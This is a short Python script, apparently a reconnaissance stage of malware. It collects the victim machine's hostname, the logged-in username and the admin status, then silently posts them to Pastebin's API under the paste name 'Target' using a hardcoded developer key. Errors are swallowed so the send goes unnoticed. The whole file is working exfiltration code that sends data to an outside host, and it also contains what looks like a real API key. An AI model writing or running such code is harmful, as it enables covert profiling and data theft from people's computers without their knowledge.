import ctypes
import os
import socket

import requests

host = socket.gethostname()
username = os.getlogin()

try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
privilege = is_admin
if privilege:
    privilege = "admin"
else:
    privilege = "not admin"

data = str(host) + f"\n" + str(username) + f"\n" + str(privilege)

print(data)
web = 'https://pastebin.com/api/api_post.php'
api = {'api_dev_key': '5Bhg3Csb8uX00jXqry0u57KqGsF2dodD',
       'api_paste_code': data,
       'api_paste_name': 'Target',
       'api_option': 'paste'}
try:
    send = requests.post(web, data=api)

except:
    pass
